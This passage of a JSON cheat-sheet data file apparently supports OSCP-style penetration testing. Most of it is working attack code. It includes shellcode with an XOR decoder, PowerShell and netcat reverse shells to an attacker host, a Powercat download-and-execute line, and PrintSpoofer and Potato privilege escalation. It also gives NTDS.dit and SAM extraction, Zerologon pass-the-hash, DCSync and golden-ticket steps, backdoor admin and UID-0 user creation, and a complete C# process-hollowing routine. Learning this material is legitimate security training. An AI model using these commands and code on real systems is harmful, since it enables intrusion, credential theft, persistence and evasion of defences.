            "code": "; Build \"cmd.exe\" on stack\nxor eax, eax\npush eax                    ; NULL terminator\npush 0x6578652e             ; \".exe\" (little-endian: 0x652e6578)\npush 0x646d63               ; \"cmd\" (little-endian: 0x00646d63 - has NULL!)\n\n; Better approach - avoid NULL in \"cmd\":\nxor eax, eax\npush eax\nmov eax, 0x652e6578         ; \".exe\"\npush eax\nmov eax, 0x646d6364         ; \"cmdd\" (no NULL)\nshr eax, 8                  ; Shift to get \"cmd\\0\"\npush eax"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Build strings on stack to avoid embedded NULLs."
          }
        ]
      },
      {
        "title": "Relative Jumps and Calls",
        "codes": [
          {
            "lang": "nasm",
            "code": "; GOOD: Relative addressing (position-independent)\njmp short label         ; EB xx (relative)\ncall function           ; E8 xx xx xx xx (relative)\njne back                ; 75 xx (relative)\n\n; BAD: Absolute addressing\njmp 0x00401000          ; EA xx xx xx xx (absolute - rare)\ncall [0x00401000]       ; FF 15 xx xx xx xx (indirect absolute)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "All jumps/calls in shellcode should be relative."
          }
        ]
      },
      {
        "title": "Self-Modifying Decode Stub",
        "codes": [
          {
            "lang": "nasm",
            "code": "decoder:\n    jmp short encoded\ndecode_start:\n    pop esi                 ; ESI = address of encoded shellcode\n    xor ecx, ecx\n    mov cl, <length>        ; Length of encoded data\n\ndecode_loop:\n    xor byte [esi], <key>   ; XOR decode each byte\n    inc esi\n    loop decode_loop\n    jmp short decoded_code\n\nencoded:\n    call decode_start\ndecoded_code:\n    ; ... XOR-encoded shellcode bytes here ..."
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Decode encrypted shellcode at runtime."
          }
        ]
      },
      {
        "title": "Testing Position Independence",
        "codes": [
          {
            "lang": "python",
            "code": "import ctypes\nimport mmap\n\nshellcode = b\"\\x90\\x90...\"  # Your shellcode\n\n# Test 1: Execute at one address\nmem1 = mmap.mmap(-1, len(shellcode), prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)\nmem1.write(shellcode)\n\n# Test 2: Execute at different address\nmem2 = mmap.mmap(-1, len(shellcode) + 0x1000, prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)\nmem2.seek(0x500)  # Different offset\nmem2.write(shellcode)\n\n# Both should execute identically"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Verify shellcode works at different addresses."
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "PIC Shellcode Techniques",
        "url": "http://www.vividmachines.com/shellcode/shellcode.html"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Techniques for writing shellcode that executes correctly at any memory address."
      }
    ]
  },
  {
    "category": "MS SQL Enumeration",
    "title": "Post-Authentication Enumeration",
    "tags": [
      "Exploitation",
      "SQL",
      "Windows"
    ],
    "steps": [
      {
        "title": "List Databases",
        "codes": [
          {
            "lang": "sql",
            "code": "SELECT name FROM master.sys.databases"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "List Users",
        "codes": [
          {
            "lang": "sql",
            "code": "SELECT name FROM master.sys.server_principals"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Check Server Roles",
        "codes": [
          {
            "lang": "sql",
            "code": "SELECT IS_SRVROLEMEMBER('sysadmin')"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Check Impersonation Privileges",
        "codes": [
          {
            "lang": "sql",
            "code": "SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "Post-Compromise Strategy",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "**1. Situational Awareness:** `whoami /all`, `systeminfo`, `ipconfig /all`\n**2. Local Privilege Escalation:** Check services, permissions, known exploits\n**3. Credential Gathering:** LSASS dump, SAM dump, browser creds, cmdkey, config files\n**4. Internal Reconnaissance:** PowerView, ldapdomaindump, BloodHound collection\n**5. Analyze Attack Paths:** BloodHound queries, ACL abuse opportunities\n**6. Lateral Movement:** Pass-the-Hash, Pass-the-Ticket, psexec, WinRM\n**7. Domain Privilege Escalation:** Kerberoast, DCSync, delegation attacks\n**8. Persistence:** Add DA user, Golden Ticket, scheduled tasks"
      }
    ]
  },
  {
    "category": "OSCP Exam Strategy",
    "title": "Post-Exam Report",
    "tags": [
      "Exam",
      "OSCP",
      "Workflow"
    ],
    "steps": [
      {
        "title": "24-Hour Report Window",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "**After Exam Ends:**\n- You have 24 hours to submit report\n- Report must be professional and detailed\n- Include all screenshots and commands\n- Follow OffSec report template"
          },
          {
            "type": "text",
            "content": "**Report Structure:**\n1. Executive Summary\n2. High-Level Summary (point breakdown)\n3. Methodology\n4. Machine 1 Walkthrough\n5. Machine 2 Walkthrough\n6. Machine 3 Walkthrough\n7. AD Set Walkthrough (if applicable)\n8. Appendix (proof screenshots)"
          },
          {
            "type": "note",
            "content": "Use the official OffSec report template - don't create your own format.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Linux Kiosk Breakout",
    "title": "Post-Exploitation",
    "tags": [
      "Defense_Evasion",
      "Linux",
      "Mobile",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Simulating Interactive Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "# If limited shell available\npython -c 'import pty; pty.spawn(\"/bin/bash\")'\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Upgrade Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "script -qc /bin/bash /dev/null\nexport TERM=xterm"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Zerologon",
    "title": "Post-Exploitation",
    "tags": [
      "Active_Directory",
      "CVE-2020-1472",
      "Domain_Controller",
      "Exploitation"
    ],
    "steps": [
      {
        "title": "Use Dumped Credentials",
        "substeps": [
          {
            "title": "Pass-the-Hash as Administrator",
            "codes": [
              {
                "lang": "bash",
                "code": "impacket-psexec -hashes :<AdminNTLMHash> Administrator@<DC-IP>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "DCSync with Administrator Hash",
            "codes": [
              {
                "lang": "bash",
                "code": "impacket-secretsdump -hashes :<AdminNTLMHash> 'corp.local/Administrator@192.168.1.10'"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Create Golden Ticket",
            "codes": [
              {
                "lang": "bash",
                "code": "# Using krbtgt hash from dump\nimpacket-ticketer -nthash <KrbtgtHash> -domain-sid <DomainSID> -domain corp.local Administrator"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Access Token Attacks",
    "title": "Potato Attacks",
    "tags": [
      "Credential_Access",
      "Privilege_Escalation",
      "Token_Manipulation",
      "Windows"
    ],
    "steps": [
      {
        "title": "PrintSpoofer (SeImpersonatePrivilege)",
        "codes": [
          {
            "lang": "bash",
            "code": "PrintSpoofer.exe -i -c \"cmd.exe\"\nPrintSpoofer.exe -c \"C:\\Windows\\Temp\\nc.exe <AttackerIP> <Port> -e cmd.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "GodPotato",
        "codes": [
          {
            "lang": "bash",
            "code": "GodPotato.exe -cmd \"cmd /c whoami\"\nGodPotato.exe -cmd \"C:\\Windows\\Temp\\nc.exe -e cmd.exe <AttackerIP> <Port>\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "JuicyPotato (Windows 10 < 1809)",
        "codes": [
          {
            "lang": "bash",
            "code": "JuicyPotato.exe -l 9999 -p C:\\Windows\\Temp\\nc.exe -a \"<AttackerIP> <Port> -e cmd.exe\" -t *"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Windows Kiosk Breakout",
    "title": "PowerShell Alternatives",
    "tags": [
      "Defense_Evasion",
      "Mobile",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Via Run Dialog",
        "codes": [
          {
            "lang": "text",
            "code": "powershell\npowershell -ep bypass\ncmd /k powershell"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Via File Associations",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Open .ps1 file to execute PowerShell.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "PowerShell One-Liner",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [
      {
        "title": "Extract NTDS.dit in One Command",
        "codes": [
          {
            "lang": "powershell",
            "code": "$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create('C:\\', 'ClientAccessible'); $device = (Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $shadow.ShadowID }).DeviceObject; cmd /c copy \"$device\\Windows\\NTDS\\ntds.dit\" C:\\Temp\\ntds.dit; cmd /c copy \"$device\\Windows\\System32\\config\\SYSTEM\" C:\\Temp\\SYSTEM"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Extract SAM in One Command",
        "codes": [
          {
            "lang": "powershell",
            "code": "$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create('C:\\', 'ClientAccessible'); $device = (Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $shadow.ShadowID }).DeviceObject; cmd /c copy \"$device\\Windows\\System32\\config\\SAM\" C:\\Temp\\SAM; cmd /c copy \"$device\\Windows\\System32\\config\\SYSTEM\" C:\\Temp\\SYSTEM"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Reverse Shells",
    "title": "PowerShell Reverse Shells",
    "tags": [
      "Execution",
      "Exploitation",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "PowerShell TCP Client",
        "codes": [
          {
            "lang": "powershell",
            "code": "$client = New-Object System.Net.Sockets.TCPClient('<AttackerIP>',<Port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Base64 Encode PowerShell",
        "codes": [
          {
            "lang": "bash",
            "code": "echo -n '<PowerShellCommand>' | iconv -t UTF-16LE | base64 -w 0"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": true
      },
      {
        "title": "Execute Base64 Encoded",
        "codes": [
          {
            "lang": "bash",
            "code": "powershell -enc <Base64String>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Powercat",
        "codes": [
          {
            "lang": "powershell",
            "code": "IEX (New-Object Net.WebClient).DownloadString('http://<AttackerIP>/powercat.ps1');powercat -c <AttackerIP> -p <Port> -e powershell"
          }
        ],
        "optional": false,
        "alternative": true,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Active Directory and Kerberos Attacks",
    "title": "PowerView Enumeration",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Windows"
    ],
    "steps": [
      {
        "title": "Load PowerView",
        "codes": [
          {
            "lang": "powershell",
            "code": "Import-Module .\\PowerView.ps1\npowershell -ep bypass\n. .\\PowerView.ps1"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Domain Enumeration",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-NetDomain\nGet-DomainController\nGet-NetUser | select cn,description\nGet-NetUser -SPN | select samaccountname,serviceprincipalname\nGet-DomainUser -PreauthNotRequired\nGet-NetGroup | select samaccountname\nGet-NetGroup \"Domain Admins\" | select member\nGet-DomainGroupMember -Identity \"Domain Admins\"\nGet-NetComputer | select dnshostname,operatingsystem\nGet-NetComputer -Ping | select dnshostname, operatingsystem\nGet-DomainComputer -Unconstrained"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Session and Admin Access",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-NetLoggedon -ComputerName <ComputerName>\nGet-NetSession -ComputerName <ComputerName> -Verbose\nFind-DomainUserLocation -User <Username>\nFind-LocalAdminAccess -Verbose"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "**Get-NetLoggedon** requires local admin on target. **Get-NetSession** works on file servers and DCs."
          }
        ]
      },
      {
        "title": "ACL Enumeration",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-ObjectAcl -Identity \"<DistinguishedName_or_Name>\" -ResolveGUIDs\nFind-InterestingDomainAcl -ResolveGUIDs\nConvert-SidToName <SID_String>\nGet-ObjectAcl -Identity \"Domain Admins\" | ? {$_.ActiveDirectoryRights -eq \"GenericAll\"} | select SecurityIdentifier,ActiveDirectoryRights"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Share Enumeration",
        "codes": [
          {
            "lang": "powershell",
            "code": "Find-DomainShare\nFind-DomainShare -CheckShareAccess -Verbose"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Delegation Enumeration",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-DomainComputer -Unconstrained\nGet-DomainUser -TrustedToAuth\nGet-DomainComputer -TrustedToAuth"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "GPO Enumeration",
        "codes": [
          {
            "lang": "powershell",
            "code": "Get-NetGPO | select displayname\nGet-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "PowerView",
        "url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "PowerShell AD enumeration tool. Run from domain-joined Windows host."
      }
    ]
  },
  {
    "category": "Intra-Forest Attacks",
    "title": "Printer Bug (SpoolSample)",
    "tags": [
      "Active_Directory",
      "Kerberos",
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Attack Flow",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Attack sequence:\n1. Compromise server with unconstrained delegation in child domain\n2. Force root DC to authenticate to compromised server\n3. Capture root DC machine account TGT\n4. Use TGT for DCSync on root domain",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Execute Printer Bug",
        "codes": [
          {
            "lang": "bash",
            "code": "# On unconstrained delegation server\nRubeus.exe monitor /interval:5 /filteruser:<RootDC>$\n\n# Trigger authentication\nSpoolSample.exe <RootDC> <CompromisedServer>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Capture and Use TGT",
        "codes": [
          {
            "lang": "bash",
            "code": "# Import captured ticket\nRubeus.exe ptt /ticket:<Base64Ticket>\n\n# DCSync root domain\nmimikatz.exe\nlsadump::dcsync /domain:<RootDomain> /user:Administrator"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Force DC to authenticate to attacker-controlled server. Combined with unconstrained delegation to capture TGT.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "PrintSpoofer",
    "title": "PrintSpoofer",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Initial Checks",
        "codes": [
          {
            "lang": "powershell",
            "code": "whoami /priv | Select-String \"SeImpersonate|SeAssignPrimaryToken\""
          },
          {
            "lang": "powershell",
            "code": "(Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\").CurrentBuild -ge 17763"
          },
          {
            "lang": "powershell",
            "code": "(Get-Service Spooler).Status -eq 'Running'"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execution",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Download\n(New-Object Net.WebClient).DownloadFile('http://<KaliIP>/all/PrintSpoofer64.exe','ps.exe')\n\n# Spawn SYSTEM cmd\n.\\ps.exe -i -c cmd\n\n# Or run reverse shell\n.\\ps.exe -i -c \"C:\\path\\reverse.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "PrintSpoofer GitHub",
        "url": "https://github.com/itm4n/PrintSpoofer"
      },
      {
        "text": "HackTricks PrintSpoofer",
        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/roguepotato-and-printspoofer"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Abuses Print Spooler service via named pipes to impersonate SYSTEM. Requires **SeImpersonatePrivilege** or **SeAssignPrimaryTokenPrivilege**. Works on Windows 10 build 1809+ and Server 2019+.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Token Impersonation - Potato Attacks",
    "title": "PrintSpoofer",
    "tags": [
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Download",
        "codes": [
          {
            "lang": "powershell",
            "code": "iwr -uri http://<KaliIP>/PrintSpoofer64.exe -Outfile PrintSpoofer.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Interactive Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "PrintSpoofer.exe -i -c cmd"
          },
          {
            "lang": "bash",
            "code": "PrintSpoofer64.exe -i -c powershell.exe"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Reverse Shell",
        "codes": [
          {
            "lang": "bash",
            "code": "PrintSpoofer.exe -c \"C:\\Windows\\Temp\\nc.exe <AttackerIP> <Port> -e cmd.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Execute Command",
        "codes": [
          {
            "lang": "bash",
            "code": "PrintSpoofer.exe -c \"whoami\""
          },
          {
            "lang": "bash",
            "code": "PrintSpoofer.exe -c \"net user hacker Password123! /add && net localgroup administrators hacker /add\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [
      {
        "text": "PrintSpoofer GitHub",
        "url": "https://github.com/itm4n/PrintSpoofer"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Abuses Print Spooler service. Works on Server 2016-2022 and Windows 10-11.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Linux Kiosk Breakout",
    "title": "Privilege Escalation in Kiosk",
    "tags": [
      "Defense_Evasion",
      "Linux",
      "Mobile",
      "Privilege_Escalation"
    ],
    "steps": [
      {
        "title": "Check Sudo Permissions",
        "codes": [
          {
            "lang": "bash",
            "code": "sudo -l"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "SUID Binaries",
        "codes": [
          {
            "lang": "bash",
            "code": "find / -perm -4000 2>/dev/null"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Cron Jobs",
        "codes": [
          {
            "lang": "bash",
            "code": "cat /etc/crontab\nls -la /etc/cron.d/"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Kiosk User Permissions",
        "codes": [
          {
            "lang": "bash",
            "code": "id\ngroups\ncat /etc/passwd | grep kiosk"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "User Management Commands",
    "title": "Privilege Escalation via User Creation",
    "tags": [],
    "steps": [
      {
        "title": "Windows - Create Admin User",
        "codes": [
          {
            "lang": "bash",
            "code": "# Method 1: Using net commands\nnet user backdoor Password123! /add\nnet localgroup Administrators backdoor /add\nnet localgroup \"Remote Desktop Users\" backdoor /add"
          },
          {
            "lang": "powershell",
            "code": "# Method 2: Using PowerShell\n$pass = ConvertTo-SecureString \"Password123!\" -AsPlainText -Force\nNew-LocalUser -Name \"backdoor\" -Password $pass\nAdd-LocalGroupMember -Group \"Administrators\" -Member \"backdoor\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Linux - Create Root-Equivalent User",
        "codes": [
          {
            "lang": "bash",
            "code": "# Create user with UID 0 (root equivalent)\nsudo useradd -u 0 -o -g 0 -M -s /bin/bash backdoor\nsudo passwd backdoor"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "User with UID 0 has root privileges!",
            "variant": "warning"
          }
        ]
      },
      {
        "title": "Linux - Add User to sudo Without Password",
        "codes": [
          {
            "lang": "bash",
            "code": "# Edit sudoers file\nsudo visudo\n\n# Add this line\nhacker ALL=(ALL) NOPASSWD:ALL"
          },
          {
            "lang": "bash",
            "code": "# Or add to sudoers.d\necho \"hacker ALL=(ALL) NOPASSWD:ALL\" | sudo tee /etc/sudoers.d/hacker"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Invoke-RunasCs",
    "title": "Privilege Escalation Workflow",
    "tags": [
      "Lateral_Movement",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Step 1: Find Credentials",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Search for credentials in files\nGet-ChildItem -Path C:\\ -Include *.txt,*.ini,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern \"password\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 2: Verify Credentials",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Test if credentials work\nInvoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"whoami\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 3: Get Reverse Shell",
        "codes": [
          {
            "lang": "powershell",
            "code": "# Setup listener on Kali\nnc -lvnp 443\n\n# Execute reverse shell as Administrator\nInvoke-RunasCs -Username Administrator -Password 'Password123!' -Command \"C:\\Temp\\nc.exe 10.10.14.5 443 -e cmd.exe\""
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Step 4: Verify Privileges",
        "codes": [
          {
            "lang": "bash",
            "code": "whoami\nwhoami /priv\nwhoami /groups"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Process Hollowing",
    "title": "Process Hollowing in C#",
    "tags": [
      "Code_Injection",
      "Defense_Evasion",
      "Process_Hollowing",
      "Windows"
    ],
    "steps": [
      {
        "title": "API Imports",
        "codes": [
          {
            "lang": "csharp",
            "code": "using System;\nusing System.Runtime.InteropServices;\n\npublic class ProcessHollowing\n{\n    [DllImport(\"kernel32.dll\", SetLastError = true, CharSet = CharSet.Auto)]\n    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);\n\n    [DllImport(\"ntdll.dll\", CallingConvention = CallingConvention.StdCall)]\n    static extern int NtUnmapViewOfSection(IntPtr hProcess, IntPtr pBaseAddress);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT lpContext);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT lpContext);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern uint ResumeThread(IntPtr hThread);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);\n\n    // Structures\n    [StructLayout(LayoutKind.Sequential)]\n    public struct PROCESS_INFORMATION\n    {\n        public IntPtr hProcess;\n        public IntPtr hThread;\n        public uint dwProcessId;\n        public uint dwThreadId;\n    }\n\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n    public struct STARTUPINFO\n    {\n        public Int32 cb;\n        public string lpReserved;\n        public string lpDesktop;\n        public string lpTitle;\n        public Int32 dwX;\n        public Int32 dwY;\n        public Int32 dwXSize;\n        public Int32 dwYSize;\n        public Int32 dwXCountChars;\n        public Int32 dwYCountChars;\n        public Int32 dwFillAttribute;\n        public Int32 dwFlags;\n        public Int16 wShowWindow;\n        public Int16 cbReserved2;\n        public IntPtr lpReserved2;\n        public IntPtr hStdInput;\n        public IntPtr hStdOutput;\n        public IntPtr hStdError;\n    }\n\n    const uint CREATE_SUSPENDED = 0x00000004;\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Complete Process Hollowing Implementation",
        "codes": [
          {
            "lang": "csharp",
            "code": "public static void Hollow(byte[] payload, string targetPath)\n{\n    STARTUPINFO si = new STARTUPINFO();\n    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();\n\n    // Create suspended process\n    bool res = CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);\n\n    // Parse PE headers from payload\n    int e_lfanew = BitConverter.ToInt32(payload, 0x3C);\n    int entryPointRva = BitConverter.ToInt32(payload, e_lfanew + 0x28);\n    int imageBase = BitConverter.ToInt32(payload, e_lfanew + 0x34);\n\n    // Get thread context to find PEB\n    CONTEXT ctx = new CONTEXT();\n    ctx.ContextFlags = CONTEXT_FULL;\n    GetThreadContext(pi.hThread, ref ctx);\n\n    // Read PEB to get current image base\n    byte[] pebBytes = new byte[8];\n    ReadProcessMemory(pi.hProcess, (IntPtr)(ctx.Rdx + 0x10), pebBytes, 8, out _);\n    long currentImageBase = BitConverter.ToInt64(pebBytes, 0);\n\n    // Unmap original image\n    NtUnmapViewOfSection(pi.hProcess, (IntPtr)currentImageBase);\n\n    // Allocate memory at desired base\n    IntPtr newBase = VirtualAllocEx(pi.hProcess, (IntPtr)imageBase, (uint)payload.Length, 0x3000, 0x40);\n\n    // Write payload\n    WriteProcessMemory(pi.hProcess, newBase, payload, payload.Length, out _);\n\n    // Update PEB with new image base\n    WriteProcessMemory(pi.hProcess, (IntPtr)(ctx.Rdx + 0x10), BitConverter.GetBytes((long)newBase), 8, out _);\n\n    // Update entry point in thread context\n    ctx.Rcx = (ulong)((long)newBase + entryPointRva);\n    SetThreadContext(pi.hThread, ref ctx);\n\n    // Resume execution\n    ResumeThread(pi.hThread);\n}"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Common Target Processes",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Good target processes:\n- **svchost.exe** - Common system process, many instances normal\n- **RuntimeBroker.exe** - Windows 10 common process\n- **dllhost.exe** - COM surrogate process",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [],
    "advanced": true
  },
  {
    "category": "Process Hollowing",
